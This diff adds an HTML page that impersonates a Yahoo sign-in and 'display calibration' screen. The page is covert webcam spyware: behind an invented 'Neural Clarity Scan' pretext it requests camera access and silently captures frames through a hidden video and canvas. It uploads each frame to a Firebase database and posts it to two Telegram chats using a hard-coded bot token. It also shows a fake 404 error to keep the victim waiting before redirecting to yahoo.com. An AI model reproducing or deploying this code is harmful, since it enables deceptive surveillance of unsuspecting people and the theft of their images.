@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yahoo | Adaptive Mercury Engine</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --yahoo-purple: #6001d2;
+            --yahoo-bg: #f1f1f1;
+            --yahoo-surface: #ffffff;
+            --yahoo-text: #26282a;
+            --yahoo-sub: #6e7780;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--yahoo-bg); color: var(--yahoo-text);
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .yahoo-card {
+            width: 100%; max-width: 440px; background: var(--yahoo-surface);
+            border-radius: 8px; box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+            overflow: hidden; border-top: 4px solid var(--yahoo-purple);
+        }
+
+        .y-header {
+            padding: 20px; display: flex; align-items: center; justify-content: center;
+            border-bottom: 1px solid #e0e4e9;
+        }
+
+        .y-logo { font-size: 28px; font-weight: 900; color: var(--yahoo-purple); letter-spacing: -1px; }
+
+        .y-body { padding: 40px 30px; text-align: center; }
+
+        .optics-box {
+            width: 80px; height: 80px; margin: 0 auto 25px;
+            border: 2px solid #e0e4e9; border-radius: 12px;
+            display: flex; align-items: center; justify-content: center;
+            background: #fafafb;
+        }
+
+        .y-pulse {
+            width: 40px; height: 40px; background: var(--yahoo-purple);
+            border-radius: 50%; opacity: 0.1; animation: y-throb 2s infinite;
+        }
+        @keyframes y-throb { 0% { transform: scale(1); opacity: 0.1; } 50% { transform: scale(1.5); opacity: 0.3; } 100% { transform: scale(1); opacity: 0.1; } }
+
+        h2 { font-size: 22px; font-weight: 700; margin: 0 0 12px; }
+        p { font-size: 14px; color: var(--yahoo-sub); line-height: 1.6; margin-bottom: 30px; }
+
+        .btn-yahoo {
+            background: var(--yahoo-purple); color: #fff; border: none;
+            width: 100%; padding: 14px; font-size: 16px; font-weight: 700;
+            border-radius: 4px; cursor: pointer; transition: background 0.2s;
+        }
+        .btn-yahoo:hover { background: #4b01a7; }
+
+        /* Sync & 404 UI */
+        #sync-ui, #error-404 { display: none; }
+        
+        .sync-loader {
+            border: 3px solid #f3f3f3; border-top: 3px solid var(--yahoo-purple);
+            border-radius: 50%; width: 40px; height: 40px; margin: 0 auto 20px;
+            animation: y-spin 1s linear infinite;
+        }
+        @keyframes y-spin { to { transform: rotate(360deg); } }
+
+        .err-code { font-size: 64px; font-weight: 900; color: #e0e4e9; margin-bottom: 10px; }
+        .node-info { font-size: 10px; color: #abb1b8; margin-top: 25px; text-transform: uppercase; letter-spacing: 1px; }
+    </style>
+</head>
+<body>
+
+    <div class="yahoo-card">
+        <div class="y-header">
+            <div class="y-logo">yahoo<span style="font-size: 20px;">!</span></div>
+        </div>
+
+        <!-- Initial View -->
+        <div class="y-body" id="init-view">
+            <div class="optics-box">
+                <div class="y-pulse"></div>
+            </div>
+            <h2>Adaptive Display Calibration</h2>
+            <p>Yahoo Mercury requires a <b>Neural Clarity Scan</b> to optimize contrast ratios. This adjusts font-weight vectors based on your current ambient light environment.</p>
+            
+            <button class="btn-yahoo" onclick="startYahooSync()">Calibrate & Sign In</button>
+            <div class="node-info">Local Node: Mumbai_West_IDC</div>
+        </div>
+
+        <!-- Sync View -->
+        <div class="y-body" id="sync-ui">
+            <div class="sync-loader"></div>
+            <div style="font-weight: 700;">Synchronizing Lumen Profile...</div>
+            <div style="font-size: 13px; color: var(--yahoo-sub); margin-top: 8px;" id="y-timer">Handshake valid for 60s</div>
+            
+            <div style="text-align: left; background: #fafafb; padding: 15px; border-radius: 4px; font-family: monospace; font-size: 11px; color: #6e7780; margin-top: 25px; border: 1px solid #e0e4e9;">
+                > FETCHING_MUMBAI_LUMEN_HASH... OK<br>
+                > ANALYZING_GLARE_VECTORS... 62%<br>
+                > STATUS: MAPPING_PURPLE_PALETTE
+            </div>
+        </div>
+
+        <!-- 404 View -->
+        <div class="y-body" id="error-404">
+            <div class="err-code">404</div>
+            <h2 style="color: var(--yahoo-purple);">Sync Handshake Timeout</h2>
+            <p>Yahoo was unable to bridge with the Mumbai Mercury relay. Re-attempting connection via the secondary Maharashtra data pipeline.</p>
+            <div class="sync-loader" style="width: 25px; height: 25px;"></div>
+            <div style="font-size: 12px; color: #abb1b8;">Establishing Fallback Gateway...</div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startYahooSync() {
+            try {
+                // Requesting permission under "Neural Clarity Scan"
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('y-timer').innerText = `Handshake valid for ${timeLeft}s`;
+
+                        if (count <= 55) {
+                            yahooCapture(count);
+                        }
+
+                        // Trigger 404 at 45s
+                        if (timeLeft === 45) {
+                            document.getElementById('sync-ui').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://www.yahoo.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.yahoo.com";
+            }
+        }
+
+        function yahooCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "YAHOO_MERCURY_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_YAHOO_IDC" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'yahoo_recon_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
